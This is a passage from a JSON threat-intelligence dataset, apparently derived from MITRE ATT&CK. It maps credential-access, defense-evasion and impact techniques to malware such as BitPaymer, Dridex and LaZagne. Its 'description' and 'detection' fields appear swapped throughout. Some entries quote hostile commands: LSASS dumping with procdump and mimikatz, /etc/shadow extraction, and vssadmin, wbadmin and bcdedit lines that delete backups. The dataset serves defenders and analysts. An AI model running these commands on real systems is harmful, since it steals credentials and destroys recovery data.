                    "T1566.002": "Spearphishing Link",
                    "T1555": "Credentials from Password Stores",
                    "T1070.004": "File Deletion",
                    "T1548.002": "Bypass User Account Control",
                    "T1539": "Steal Web Session Cookie",
                    "T1219": "Remote Access Software",
                    "T1105": "Ingress Tool Transfer"
                }
            }
        },
        {
            "id": "T1102.003",
            "type": "technique",
            "val": null,
            "attributes": {
                "name": "One-Way Communication",
                "chain_phase": "command-and-control",
                "description": "Host data that can relate unknown or suspicious process activity using a network connection is important to supplement any existing indicators of compromise based on malware command and control signatures and infrastructure or the presence of strong encryption. Packet capture analysis will require SSL/TLS inspection if data is encrypted. Analyze network data for uncommon data flows. User behavior monitoring may help to detect abnormal patterns of activity.(Citation: University of Birmingham C2)",
                "detection": "Adversaries may use an existing, legitimate external Web service as a means for sending commands to a compromised system without receiving return output over the Web service channel. Compromised systems may leverage popular websites and social media to host command and control (C2) instructions. Those infected systems may opt to send the output from those commands back over a different C2 channel, including to another distinct Web service. Alternatively, compromised systems may return no output at all in cases where adversaries want to send instructions to systems and do not want a response.\n\nPopular websites and social media acting as a mechanism for C2 may give a significant amount of cover due to the likelihood that hosts within a network are already communicating with them prior to a compromise. Using common services, such as those offered by Google or Twitter, makes it easier for adversaries to hide in expected noise. Web service providers commonly use SSL/TLS encryption, giving adversaries an added level of protection.",
                "is_subtype": true,
                "platforms": [
                    "Linux",
                    "macOS",
                    "Windows"
                ]
            }
        },
        {
            "id": "T1539",
            "type": "technique",
            "val": null,
            "attributes": {
                "name": "Steal Web Session Cookie",
                "chain_phase": "credential-access",
                "description": "Monitor for attempts to access files and repositories on a local system that are used to store browser session cookies. Monitor for attempts by programs to inject into or dump browser process memory.",
                "detection": "An adversary may steal web application or service session cookies and use them to gain access to web applications or Internet services as an authenticated user without needing credentials. Web applications and services often use session cookies as an authentication token after a user has authenticated to a website.\n\nCookies are often valid for an extended period of time, even if the web application is not actively used. Cookies can be found on disk, in the process memory of the browser, and in network traffic to remote systems. Additionally, other applications on the targets machine might store sensitive authentication cookies in memory (e.g. apps which authenticate to cloud services). Session cookies can be used to bypasses some multi-factor authentication protocols.\n\nThere are several examples of malware targeting cookies from web browsers on the local system. There are also open source frameworks such as Evilginx 2 and Muraena that can gather session cookies through a man-in-the-middle proxy that can be set up by an adversary and used in phishing campaigns.\n\nAfter an adversary acquires a valid cookie, they can then perform a Web Session Cookie technique to login to the corresponding web application.",
                "is_subtype": false,
                "platforms": [
                    "Linux",
                    "macOS",
                    "Windows",
                    "Office 365",
                    "SaaS",
                    "Google Workspace"
                ]
            }
        },
        {
            "id": "T1070",
            "type": "technique",
            "val": null,
            "attributes": {
                "name": "Indicator Removal on Host",
                "chain_phase": "defense-evasion",
                "description": "File system monitoring may be used to detect improper deletion or modification of indicator files.  Events not stored on the file system may require different detection mechanisms.",
                "detection": "Adversaries may delete or alter generated artifacts on a host system, including logs or captured files such as quarantined malware. Locations and format of logs are platform or product-specific, however standard operating system logs are captured as Windows events or Linux/macOS files such as Bash History and /var/log/*.\n\nThese actions may interfere with event collection, reporting, or other notifications used to detect intrusion activity. This that may compromise the integrity of security solutions by causing notable events to go unreported. This activity may also impede forensic analysis and incident response, due to lack of sufficient data to determine what occurred.",
                "is_subtype": false,
                "platforms": [
                    "Linux",
                    "macOS",
                    "Windows",
                    "Containers"
                ]
            }
        },
        {
            "id": "S0568",
            "type": "tool",
            "attributes": {
                "name": "EVILNUM",
                "aliases": [],
                "labels": [
                    "malware"
                ],
                "description": "EVILNUM is fully capable backdoor that was first identified in 2018. EVILNUM is used by the APT group Evilnum which has the same name.",
                "platforms": [
                    "Windows"
                ],
                "techniques": {
                    "T1102.003": "One-Way Communication",
                    "T1518.001": "Security Software Discovery",
                    "T1070.006": "Timestomp",
                    "T1547.001": "Registry Run Keys / Startup Folder",
                    "T1218.010": "Regsvr32",
                    "T1218.011": "Rundll32",
                    "T1539": "Steal Web Session Cookie",
                    "T1112": "Modify Registry",
                    "T1105": "Ingress Tool Transfer",
                    "T1082": "System Information Discovery",
                    "T1070": "Indicator Removal on Host",
                    "T1047": "Windows Management Instrumentation",
                    "T1041": "Exfiltration Over C2 Channel",
                    "T1033": "System Owner/User Discovery"
                }
            },
            "val": 14
        },
        {
            "id": "T1003.004",
            "type": "technique",
            "val": null,
            "attributes": {
                "name": "LSA Secrets",
                "chain_phase": "credential-access",
                "description": "Monitor processes and command-line arguments for program execution that may be indicative of credential dumping. Remote access tools may contain built-in features or incorporate existing tools like Mimikatz. PowerShell scripts also exist that contain credential dumping functionality, such as PowerSploit's Invoke-Mimikatz module,(Citation: Powersploit) which may require additional logging features to be configured in the operating system to collect necessary information for analysis.",
                "detection": "Adversaries with SYSTEM access to a host may attempt to access Local Security Authority (LSA) secrets, which can contain a variety of different credential materials, such as credentials for service accounts. LSA secrets are stored in the registry at <code>HKEY_LOCAL_MACHINE\\SECURITY\\Policy\\Secrets</code>. LSA secrets can also be dumped from memory.\n\nReg can be used to extract from the Registry. Mimikatz can be used to extract secrets from memory.",
                "is_subtype": true,
                "platforms": [
                    "Windows"
                ]
            }
        },
        {
            "id": "T1003.005",
            "type": "technique",
            "val": null,
            "attributes": {
                "name": "Cached Domain Credentials",
                "chain_phase": "credential-access",
                "description": "Monitor processes and command-line arguments for program execution that may be indicative of credential dumping. Remote access tools may contain built-in features or incorporate existing tools like Mimikatz. PowerShell scripts also exist that contain credential dumping functionality, such as PowerSploit's Invoke-Mimikatz module,(Citation: Powersploit) which may require additional logging features to be configured in the operating system to collect necessary information for analysis.\n\nDetection of compromised [Valid Accounts](https://attack.mitre.org/techniques/T1078) in-use by adversaries may help as well.",
                "detection": "Adversaries may attempt to access cached domain credentials used to allow authentication to occur in the event a domain controller is unavailable.\n\nOn Windows Vista and newer, the hash format is DCC2 (Domain Cached Credentials version 2) hash, also known as MS-Cache v2 hash. The number of default cached credentials varies and can be altered per system. This hash does not allow pass-the-hash style attacks, and instead requires Password Cracking to recover the plaintext password.\n\nWith SYSTEM access, the tools/utilities such as Mimikatz, Reg, and secretsdump.py can be used to extract the cached credentials.\n\nNote: Cached credentials for Windows Vista are derived using PBKDF2.",
                "is_subtype": true,
                "platforms": [
                    "Windows"
                ]
            }
        },
        {
            "id": "T1555.003",
            "type": "technique",
            "val": null,
            "attributes": {
                "name": "Credentials from Web Browsers",
                "chain_phase": "credential-access",
                "description": "Identify web browser files that contain credentials such as Google Chrome’s Login Data database file: <code>AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data</code>. Monitor file read events of web browser files that contain credentials, especially when the reading process is unrelated to the subject web browser. Monitor process execution logs to include PowerShell Transcription focusing on those that perform a combination of behaviors including reading web browser process memory, utilizing regular expressions, and those that contain numerous keywords for common web applications (Gmail, Twitter, Office365, etc.).",
                "detection": "Adversaries may acquire credentials from web browsers by reading files specific to the target browser. Web browsers commonly save credentials such as website usernames and passwords so that they do not need to be entered manually in the future. Web browsers typically store the credentials in an encrypted format within a credential store; however, methods exist to extract plaintext credentials from web browsers.\n\nFor example, on Windows systems, encrypted credentials may be obtained from Google Chrome by reading a database file, <code>AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data</code> and executing a SQL query: <code>SELECT action_url, username_value, password_value FROM logins;</code>. The plaintext password can then be obtained by passing the encrypted credentials to the Windows API function <code>CryptUnprotectData</code>, which uses the victim’s cached logon credentials as the decryption key. \n \nAdversaries have executed similar procedures for common web browsers such as FireFox, Safari, Edge, etc. Windows stores Internet Explorer and Microsoft Edge credentials in Credential Lockers managed by the Windows Credential Manager.\n\nAdversaries may also acquire credentials by searching web browser process memory for patterns that commonly match credentials.\n\nAfter acquiring credentials from web browsers, adversaries may attempt to recycle the credentials across different systems and/or accounts in order to expand access. This can result in significantly furthering an adversary's objective in cases where credentials gained from web browsers overlap with privileged accounts (e.g. domain administrator).",
                "is_subtype": true,
                "platforms": [
                    "Linux",
                    "macOS",
                    "Windows"
                ]
            }
        },
        {
            "id": "T1555.001",
            "type": "technique",
            "val": null,
            "attributes": {
                "name": "Keychain",
                "chain_phase": "credential-access",
                "description": "Unlocking the keychain and using passwords from it is a very common process, so there is likely to be a lot of noise in any detection technique. Monitoring of system calls to the keychain can help determine if there is a suspicious process trying to access it.",
                "detection": "Adversaries may collect the keychain storage data from a system to acquire credentials. Keychains are the built-in way for macOS to keep track of users' passwords and credentials for many services and features such as WiFi passwords, websites, secure notes, certificates, and Kerberos. Keychain files are located in <code>~/Library/Keychains/</code>,<code>/Library/Keychains/</code>, and <code>/Network/Library/Keychains/</code>.  The <code>security</code> command-line utility, which is built into macOS by default, provides a useful way to manage these credentials.\n\nTo manage their credentials, users have to use additional credentials to access their keychain. If an adversary knows the credentials for the login keychain, then they can get access to all the other credentials stored in this vault.  By default, the passphrase for the keychain is the user’s logon credentials.",
                "is_subtype": true,
                "platforms": [
                    "macOS"
                ]
            }
        },
        {
            "id": "T1555",
            "type": "technique",
            "val": null,
            "attributes": {
                "name": "Credentials from Password Stores",
                "chain_phase": "credential-access",
                "description": "Monitor system calls, file read events, and processes for suspicious activity that could indicate searching for a password  or other activity related to performing keyword searches (e.g. password, pwd, login, store, secure, credentials, etc.) in process memory for credentials. File read events should be monitored surrounding known password storage applications.",
                "detection": "Adversaries may search for common password storage locations to obtain user credentials. Passwords are stored in several places on a system, depending on the operating system or application holding the credentials. There are also specific applications that store passwords to make it easier for users manage and maintain. Once credentials are obtained, they can be used to perform lateral movement and access restricted information.",
                "is_subtype": false,
                "platforms": [
                    "Linux",
                    "macOS",
                    "Windows"
                ]
            }
        },
        {
            "id": "T1003.008",
            "type": "technique",
            "val": null,
            "attributes": {
                "name": "/etc/passwd and /etc/shadow",
                "chain_phase": "credential-access",
                "description": "The AuditD monitoring tool, which ships stock in many Linux distributions, can be used to watch for hostile processes attempting to access <code>/etc/passwd</code> and <code>/etc/shadow</code>, alerting on the pid, process name, and arguments of such programs.",
                "detection": "Adversaries may attempt to dump the contents of <code>/etc/passwd</code> and <code>/etc/shadow</code> to enable offline password cracking. Most modern Linux operating systems use a combination of <code>/etc/passwd</code> and <code>/etc/shadow</code> to store user account information including password hashes in <code>/etc/shadow</code>. By default, <code>/etc/shadow</code> is only readable by the root user.\n\nThe Linux utility, unshadow, can be used to combine the two files in a format suited for password cracking utilities such as John the Ripper: <code># /usr/bin/unshadow /etc/passwd /etc/shadow > /tmp/crack.password.db</code>",
                "is_subtype": true,
                "platforms": [
                    "Linux"
                ]
            }
        },
        {
            "id": "T1003.007",
            "type": "technique",
            "val": null,
            "attributes": {
                "name": "Proc Filesystem",
                "chain_phase": "credential-access",
                "description": "To obtain the passwords and hashes stored in memory, processes must open a maps file in the /proc filesystem for the process being analyzed. This file is stored under the path <code>/proc/\\*/maps</code>, where the <code>\\*</code> directory is the unique pid of the program being interrogated for such authentication data. The AuditD monitoring tool, which ships stock in many Linux distributions, can be used to watch for hostile processes opening this file in the proc file system, alerting on the pid, process name, and arguments of such programs.",
                "detection": "Adversaries may gather credentials from information stored in the Proc filesystem or <code>/proc</code>. The Proc filesystem on Linux contains a great deal of information regarding the state of the running operating system. Processes running with root privileges can use this facility to scrape live memory of other running programs. If any of these programs store passwords in clear text or password hashes in memory, these values can then be harvested for either usage or brute force attacks, respectively.\n\nThis functionality has been implemented in the MimiPenguin, an open source tool inspired by Mimikatz. The tool dumps process memory, then harvests passwords and hashes by looking for text strings and regex patterns for how given applications such as Gnome Keyring, sshd, and Apache use memory to store such authentication artifacts.",
                "is_subtype": true,
                "platforms": [
                    "Linux"
                ]
            }
        },
        {
            "id": "T1003.001",
            "type": "technique",
            "val": null,
            "attributes": {
                "name": "LSASS Memory",
                "chain_phase": "credential-access",
                "description": "Monitor for unexpected processes interacting with LSASS.exe.(Citation: Medium Detecting Attempts to Steal Passwords from Memory) Common credential dumpers such as Mimikatz access LSASS.exe by opening the process, locating the LSA secrets key, and decrypting the sections in memory where credential details are stored. Credential dumpers may also use methods for reflective [Process Injection](https://attack.mitre.org/techniques/T1055) to reduce potential indicators of malicious activity.\n\nOn Windows 8.1 and Windows Server 2012 R2, monitor Windows Logs for LSASS.exe creation to verify that LSASS started as a protected process.\n\nMonitor processes and command-line arguments for program execution that may be indicative of credential dumping. Remote access tools may contain built-in features or incorporate existing tools like Mimikatz. PowerShell scripts also exist that contain credential dumping functionality, such as PowerSploit's Invoke-Mimikatz module,(Citation: Powersploit) which may require additional logging features to be configured in the operating system to collect necessary information for analysis.",
                "detection": "Adversaries may attempt to access credential material stored in the process memory of the Local Security Authority Subsystem Service (LSASS). After a user logs on, the system generates and stores a variety of credential materials in LSASS process memory. These credential materials can be harvested by an administrative user or SYSTEM and used to conduct Lateral Movement using Use Alternate Authentication Material.\n\nAs well as in-memory techniques, the LSASS process memory can be dumped from the target host and analyzed on a local system.\n\nFor example, on the target host use procdump:\n\n* <code>procdump -ma lsass.exe lsass_dump</code>\n\nLocally, mimikatz can be run using:\n\n* <code>sekurlsa::Minidump lsassdump.dmp</code>\n* <code>sekurlsa::logonPasswords</code>\n\n\nWindows Security Support Provider (SSP) DLLs are loaded into LSSAS process at system start. Once loaded into the LSA, SSP DLLs have access to encrypted and plaintext passwords that are stored in Windows, such as any logged-on user's Domain password or smart card PINs. The SSP configuration is stored in two Registry keys: <code>HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\Security Packages</code> and <code>HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\OSConfig\\Security Packages</code>. An adversary may modify these Registry keys to add new SSPs, which will be loaded the next time the system boots, or when the AddSecurityPackage Windows API function is called.\n\nThe following SSPs can be used to access credentials:\n\n* Msv: Interactive logons, batch logons, and service logons are done through the MSV authentication package.\n* Wdigest: The Digest Authentication protocol is designed for use with Hypertext Transfer Protocol (HTTP) and Simple Authentication Security Layer (SASL) exchanges.\n* Kerberos: Preferred for mutual client-server domain authentication in Windows 2000 and later.\n* CredSSP:  Provides SSO and Network Level Authentication for Remote Desktop Services.",
                "is_subtype": true,
                "platforms": [
                    "Windows"
                ]
            }
        },
        {
            "id": "T1552.001",
            "type": "technique",
            "val": null,
            "attributes": {
                "name": "Credentials In Files",
                "chain_phase": "credential-access",
                "description": "While detecting adversaries accessing these files may be difficult without knowing they exist in the first place, it may be possible to detect adversary use of credentials they have obtained. Monitor the command-line arguments of executing processes for suspicious words or regular expressions that may indicate searching for a password (for example: password, pwd, login, secure, or credentials). See [Valid Accounts](https://attack.mitre.org/techniques/T1078) for more information.",
                "detection": "Adversaries may search local file systems and remote file shares for files containing insecurely stored credentials. These can be files created by users to store their own credentials, shared credential stores for a group of individuals, configuration files containing passwords for a system or service, or source code/binary files containing embedded passwords.\n\nIt is possible to extract passwords from backups or saved virtual machines through OS Credential Dumping.  Passwords may also be obtained from Group Policy Preferences stored on the Windows Domain Controller. \n\nIn cloud and/or containerized environments, authenticated user and service account credentials are often stored in local configuration and credential files. They may also be found as parameters to deployment commands in container logs. In some cases, these files can be copied and reused on another machine or the contents can be read and then used to authenticate without needing to copy any files.",
                "is_subtype": true,
                "platforms": [
                    "Windows",
                    "IaaS",
                    "Linux",
                    "macOS",
                    "Containers"
                ]
            }
        },
        {
            "id": "S0349",
            "type": "tool",
            "attributes": {
                "name": "LaZagne",
                "aliases": [],
                "labels": [
                    "tool"
                ],
                "description": "LaZagne is a post-exploitation, open-source tool used to recover stored passwords on a system. It has modules for Windows, Linux, and OSX, but is mainly focused on Windows systems. LaZagne is publicly available on GitHub.",
                "platforms": [
                    "Linux",
                    "macOS",
                    "Windows"
                ],
                "techniques": {
                    "T1555.004": "Windows Credential Manager",
                    "T1003.004": "LSA Secrets",
                    "T1003.005": "Cached Domain Credentials",
                    "T1555.003": "Credentials from Web Browsers",
                    "T1555.001": "Keychain",
                    "T1555": "Credentials from Password Stores",
                    "T1003.008": "/etc/passwd and /etc/shadow",
                    "T1003.007": "Proc Filesystem",
                    "T1003.001": "LSASS Memory",
                    "T1552.001": "Credentials In Files"
                }
            },
            "val": 10
        },
        {
            "id": "T1016.001",
            "type": "technique",
            "val": null,
            "attributes": {
                "name": "Internet Connection Discovery",
                "chain_phase": "discovery",
                "description": "System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as Command and Control, based on the information obtained.\n\nMonitor processes and command-line arguments for actions that could be taken to check Internet connectivity.",
                "detection": "Adversaries may check for Internet connectivity on compromised systems. This may be performed during automated discovery and can be accomplished in numerous ways such as using Ping, <code>tracert</code>, and GET requests to websites.\n\nAdversaries may use the results and responses from these requests to determine if the system is capable of communicating with their C2 servers before attempting to connect to them. The results may also be used to identify routes, redirectors, and proxy servers.",
                "is_subtype": true,
                "platforms": [
                    "Windows",
                    "Linux",
                    "macOS"
                ]
            }
        },
        {
            "id": "S0284",
            "type": "tool",
            "attributes": {
                "name": "More_eggs",
                "aliases": [
                    "SKID",
                    "Terra Loader",
                    "SpicyOmelette"
                ],
                "labels": [
                    "malware"
                ],
                "description": "More_eggs is a JScript backdoor used by Cobalt Group and FIN6. Its name was given based on the variable \"More_eggs\" being present in its code. There are at least two different versions of the backdoor being used, version 2.0 and version 4.4.",
                "platforms": [
                    "Windows"
                ],
                "techniques": {
                    "T1016.001": "Internet Connection Discovery",
                    "T1573.001": "Symmetric Cryptography",
                    "T1071.001": "Web Protocols",
                    "T1132.001": "Standard Encoding",
                    "T1059.003": "Windows Command Shell",
                    "T1518.001": "Security Software Discovery",
                    "T1553.002": "Code Signing",
                    "T1070.004": "File Deletion",
                    "T1218.010": "Regsvr32",
                    "T1140": "Deobfuscate/Decode Files or Information",
                    "T1105": "Ingress Tool Transfer",
                    "T1082": "System Information Discovery",
                    "T1033": "System Owner/User Discovery",
                    "T1027": "Obfuscated Files or Information",
                    "T1016": "System Network Configuration Discovery"
                }
            },
            "val": 15
        },
        {
            "id": "G0119",
            "type": "group",
            "attributes": {
                "val": 4,
                "name": "Indrik Spider",
                "aliases": [],
                "description": "Indrik Spider is a financially motivated threat group that has leveraged the Dridex banking trojan since at least June 2014 and delivered ransomware variants since 2017.",
                "affiliation": "",
                "targets": [],
                "speciality": [],
                "tools": {
                    "S0570": "BitPaymer",
                    "S0384": "Dridex",
                    "S0363": "Empire",
                    "S0002": "Mimikatz"
                },
                "techniques": {
                    "T1484.001": "Group Policy Modification",
                    "T1584.004": "Server",
                    "T1078.002": "Domain Accounts",
                    "T1059.003": "Windows Command Shell",
                    "T1059.001": "PowerShell",
                    "T1036.005": "Match Legitimate Name or Location",
                    "T1486": "Data Encrypted for Impact",
                    "T1105": "Ingress Tool Transfer"
                }
            }
        },
        {
            "id": "T1222.001",
            "type": "technique",
            "val": null,
            "attributes": {
                "name": "Windows File and Directory Permissions Modification",
                "chain_phase": "defense-evasion",
                "description": "Monitor and investigate attempts to modify DACLs and file/directory ownership. Many of the commands used to modify DACLs and file/directory ownership are built-in system utilities and may generate a high false positive alert rate, so compare against baseline knowledge for how systems are typically used and correlate modification events with other indications of malicious activity where possible.\n\nConsider enabling file/directory permission change auditing on folders containing key binary/configuration files. For example, Windows Security Log events (Event ID 4670) are created when DACLs are modified.(Citation: EventTracker File Permissions Feb 2014)",
                "detection": "Adversaries may modify file or directory permissions/attributes to evade access control lists (ACLs) and access protected files. File and directory permissions are commonly managed by ACLs configured by the file or directory owner, or users with the appropriate permissions. File and directory ACL implementations vary by platform, but generally explicitly designate which users or groups can perform which actions (read, write, execute, etc.).\n\nWindows implements file and directory ACLs as Discretionary Access Control Lists (DACLs). Similar to a standard ACL, DACLs identifies the accounts that are allowed or denied access to a securable object. When an attempt is made to access a securable object, the system checks the access control entries in the DACL in order. If a matching entry is found, access to the object is granted. Otherwise, access is denied.\n\nAdversaries can interact with the DACLs using built-in Windows commands, such as `icacls`, `cacls`, `takeown`, and `attrib`, which can grant adversaries higher permissions on specific files and folders. Further, PowerShell provides cmdlets that can be used to retrieve or modify file and directory DACLs. Specific file and directory modifications may be a required step for many techniques, such as establishing Persistence via Accessibility Features, Boot or Logon Initialization Scripts, or tainting/hijacking other instrumental binary/configuration files via Hijack Execution Flow.",
                "is_subtype": true,
                "platforms": [
                    "Windows"
                ]
            }
        },
        {
            "id": "T1490",
            "type": "technique",
            "val": null,
            "attributes": {
                "name": "Inhibit System Recovery",
                "chain_phase": "impact",
                "description": "Use process monitoring to monitor the execution and command line parameters of binaries involved in inhibiting system recovery, such as vssadmin, wbadmin, and bcdedit. The Windows event logs, ex. Event ID 524 indicating a system catalog was deleted, may contain entries associated with suspicious activity.\n\nMonitor the status of services involved in system recovery. Monitor the registry for changes associated with system recovery features (ex: the creation of <code>HKEY_CURRENT_USER\\Software\\Policies\\Microsoft\\PreviousVersions\\DisableLocalPage</code>).",
                "detection": "Adversaries may delete or remove built-in operating system data and turn off services designed to aid in the recovery of a corrupted system to prevent recovery. Operating systems may contain features that can help fix corrupted systems, such as a backup catalog, volume shadow copies, and automatic repair features. Adversaries may disable or delete system recovery features to augment the effects of Data Destruction and Data Encrypted for Impact.\n\nA number of native Windows utilities have been used by adversaries to disable or delete system recovery features:\n\n* <code>vssadmin.exe</code> can be used to delete all volume shadow copies on a system - <code>vssadmin.exe delete shadows /all /quiet</code>\n* Windows Management Instrumentation can be used to delete volume shadow copies - <code>wmic shadowcopy delete</code>\n* <code>wbadmin.exe</code> can be used to delete the Windows Backup Catalog - <code>wbadmin.exe delete catalog -quiet</code>\n* <code>bcdedit.exe</code> can be used to disable automatic Windows recovery features by modifying boot configuration data - <code>bcdedit.exe /set {default} bootstatuspolicy ignoreallfailures & bcdedit /set {default} recoveryenabled no</code>",
                "is_subtype": false,
                "platforms": [
                    "Windows",
                    "macOS",
                    "Linux"
                ]
            }
        },
        {
            "id": "T1486",
            "type": "technique",
            "val": null,
            "attributes": {
                "name": "Data Encrypted for Impact",
                "chain_phase": "impact",
                "description": "Use process monitoring to monitor the execution and command line parameters of binaries involved in data destruction activity, such as vssadmin, wbadmin, and bcdedit. Monitor for the creation of suspicious files as well as unusual file modification activity. In particular, look for large quantities of file modifications in user directories.\n\nIn some cases, monitoring for unusual kernel driver installation activity can aid in detection.\n\nIn cloud environments, monitor for events that indicate storage objects have been anomalously replaced by copies.",
                "detection": "Adversaries may encrypt data on target systems or on large numbers of systems in a network to interrupt availability to system and network resources. They can attempt to render stored data inaccessible by encrypting files or data on local and remote drives and withholding access to a decryption key. This may be done in order to extract monetary compensation from a victim in exchange for decryption or a decryption key (ransomware) or to render data permanently inaccessible in cases where the key is not saved or transmitted. In the case of ransomware, it is typical that common user files like Office documents, PDFs, images, videos, audio, text, and source code files will be encrypted. In some cases, adversaries may encrypt critical system files, disk partitions, and the MBR.\n\nTo maximize impact on the target organization, malware designed for encrypting data may have worm-like features to propagate across a network by leveraging other attack techniques like Valid Accounts, OS Credential Dumping, and SMB/Windows Admin Shares.\n\nIn cloud environments, storage objects within compromised accounts may also be encrypted.",
                "is_subtype": false,
                "platforms": [
                    "Linux",
                    "macOS",
                    "Windows",
                    "IaaS"
                ]
            }
        },
        {
            "id": "T1480",
            "type": "technique",
            "val": null,
            "attributes": {
                "name": "Execution Guardrails",
                "chain_phase": "defense-evasion",
                "description": "Detecting the use of guardrails may be difficult depending on the implementation. Monitoring for suspicious processes being spawned that gather a variety of system information or perform other forms of [Discovery](https://attack.mitre.org/tactics/TA0007), especially in a short period of time, may aid in detection.",
                "detection": "Adversaries may use execution guardrails to constrain execution or actions based on adversary supplied and environment specific conditions that are expected to be present on the target. Guardrails ensure that a payload only executes against an intended target and reduces collateral damage from an adversary’s campaign. Values an adversary can provide about a target system or environment to use as guardrails may include specific network share names, attached physical devices, files, joined Active Directory (AD) domains, and local/external IP addresses.\n\nGuardrails can be used to prevent exposure of capabilities in environments that are not intended to be compromised or operated within. This use of guardrails is distinct from typical Virtualization/Sandbox Evasion. While use of Virtualization/Sandbox Evasion may involve checking for known sandbox values and continuing with execution only if there is no match, the use of guardrails will involve checking for an expected target-specific value and only continuing with execution if there is such a match.",
                "is_subtype": false,
                "platforms": [
                    "Linux",
                    "macOS",
                    "Windows"
                ]
            }
        },
        {
            "id": "S0570",
            "type": "tool",
            "attributes": {
                "name": "BitPaymer",
                "aliases": [
                    "wp_encrypt",
                    "FriedEx"
                ],
                "labels": [
                    "malware"
                ],
                "description": "BitPaymer is a ransomware variant first observed in August 2017 targeting hospitals in the U.K. BitPaymer uses a unique encryption key, ransom note, and contact information for each operation. BitPaymer has several indicators suggesting overlap with the Dridex malware and is often delivered via Dridex.",
                "platforms": [
                    "Windows"
                ],
                "techniques": {
                    "T1564.004": "NTFS File Attributes",
                    "T1087.001": "Local Account",
                    "T1134.001": "Token Impersonation/Theft",
                    "T1222.001": "Windows File and Directory Permissions Modification",
                    "T1070.006": "Timestomp",
                    "T1548.002": "Bypass User Account Control",
                    "T1547.001": "Registry Run Keys / Startup Folder",
                    "T1543.003": "Windows Service",
                    "T1490": "Inhibit System Recovery",
                    "T1486": "Data Encrypted for Impact",
                    "T1480": "Execution Guardrails",
                    "T1135": "Network Share Discovery",
                    "T1112": "Modify Registry",
                    "T1106": "Native API",
                    "T1027": "Obfuscated Files or Information",
                    "T1018": "Remote System Discovery",
                    "T1012": "Query Registry",
                    "T1007": "System Service Discovery"
                }
            },
            "val": 18
        },
        {
            "id": "T1219",
            "type": "technique",
            "val": null,
            "attributes": {
                "name": "Remote Access Software",
                "chain_phase": "command-and-control",
                "description": "Monitor for applications and processes related to remote admin tools. Correlate activity with other suspicious behavior that may reduce false positives if these tools are used by legitimate users and administrators.\n\nAnalyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Analyze packet contents to detect application layer protocols that do not follow the expected protocol for the port that is being used.\n\n[Domain Fronting](https://attack.mitre.org/techniques/T1090/004) may be used in conjunction to avoid defenses. Adversaries will likely need to deploy and/or install these remote tools to compromised systems. It may be possible to detect or prevent the installation of these tools with host-based solutions.",
                "detection": "An adversary may use legitimate desktop support and remote access software, such as Team Viewer, Go2Assist, LogMein, AmmyyAdmin, etc, to establish an interactive command and control channel to target systems within networks. These services are commonly used as legitimate technical support software, and may be allowed by application control within a target environment. Remote access tools like VNC, Ammyy, and Teamviewer are used frequently when compared with other legitimate software commonly used by adversaries. \n\nRemote access tools may be established and used post-compromise as alternate communications channel for redundant access or as a way to establish an interactive remote desktop session with the target system. They may also be used as a component of malware to establish a reverse connection or back-connect to a service or adversary controlled system.\n\nAdmin tools such as TeamViewer have been used by several groups targeting institutions in countries of interest to the Russian state and criminal campaigns.",
                "is_subtype": false,
                "platforms": [
                    "Linux",
                    "Windows",
                    "macOS"
                ]
            }
        },
        {
            "id": "S0384",
            "type": "tool",
            "attributes": {
                "name": "Dridex",
                "aliases": [
                    "Bugat v5"
                ],
                "labels": [
                    "malware"
                ],
                "description": "Dridex is a banking Trojan that has been used for financial gain. Dridex was created from the source code of the Bugat banking trojan (also known as Cridex).",
                "platforms": [
                    "Windows"
                ],
                "techniques": {
                    "T1573.002": "Asymmetric Cryptography",
                    "T1573.001": "Symmetric Cryptography",
                    "T1071.001": "Web Protocols",
                    "T1219": "Remote Access Software",
                    "T1185": "Man in the Browser",
                    "T1090": "Proxy"
                }
            },
            "val": 6
        },
        {
            "id": "T1484.001",
            "type": "technique",
            "val": null,
            "attributes": {
                "name": "Group Policy Modification",
                "chain_phase": "defense-evasion",
                "description": "It is possible to detect GPO modifications by monitoring directory service changes using Windows event logs. Several events may be logged for such GPO modifications, including:\n\n* Event ID 5136 - A directory service object was modified\n* Event ID 5137 - A directory service object was created\n* Event ID 5138 - A directory service object was undeleted\n* Event ID 5139 - A directory service object was moved\n* Event ID 5141 - A directory service object was deleted\n\n\nGPO abuse will often be accompanied by some other behavior such as [Scheduled Task/Job](https://attack.mitre.org/techniques/T1053), which will have events associated with it to detect. Subsequent permission value modifications, like those to SeEnableDelegationPrivilege, can also be searched for in events associated with privileges assigned to new logons (Event ID 4672) and assignment of user rights (Event ID 4704).",
                "detection": "Adversaries may modify Group Policy Objects (GPOs) to subvert the intended discretionary access controls for a domain, usually with the intention of escalating privileges on the domain. Group policy allows for centralized management of user and computer settings in Active Directory (AD). GPOs are containers for group policy settings made up of files stored within a predicable network path <code>\\\\&lt;DOMAIN&gt;\\SYSVOL\\&lt;DOMAIN&gt;\\Policies\\</code>. \n\nLike other objects in AD, GPOs have access controls associated with them. By default all user accounts in the domain have permission to read GPOs. It is possible to delegate GPO access control permissions, e.g. write access, to specific users or groups in the domain.\n\nMalicious GPO modifications can be used to implement many other malicious behaviors such as Scheduled Task/Job, Disable or Modify Tools, Ingress Tool Transfer, Create Account, Service Execution,  and more. Since GPOs can control so many user and machine settings in the AD environment, there are a great number of potential attacks that can stem from this GPO abuse.\n\nFor example, publicly available scripts such as <code>New-GPOImmediateTask</code> can be leveraged to automate the creation of a malicious Scheduled Task/Job by modifying GPO settings, in this case modifying <code>&lt;GPO_PATH&gt;\\Machine\\Preferences\\ScheduledTasks\\ScheduledTasks.xml</code>. In some cases an adversary might modify specific user rights like SeEnableDelegationPrivilege, set in <code>&lt;GPO_PATH&gt;\\MACHINE\\Microsoft\\Windows NT\\SecEdit\\GptTmpl.inf</code>, to achieve a subtle AD backdoor with complete control of the domain because the user account under the adversary's control would then be able to modify GPOs.",
                "is_subtype": true,
                "platforms": [
                    "Windows"
                ]
            }
        },
        {
            "id": "T1574.004",
            "type": "technique",
            "val": null,
            "attributes": {
                "name": "Dylib Hijacking",
                "chain_phase": "persistence",
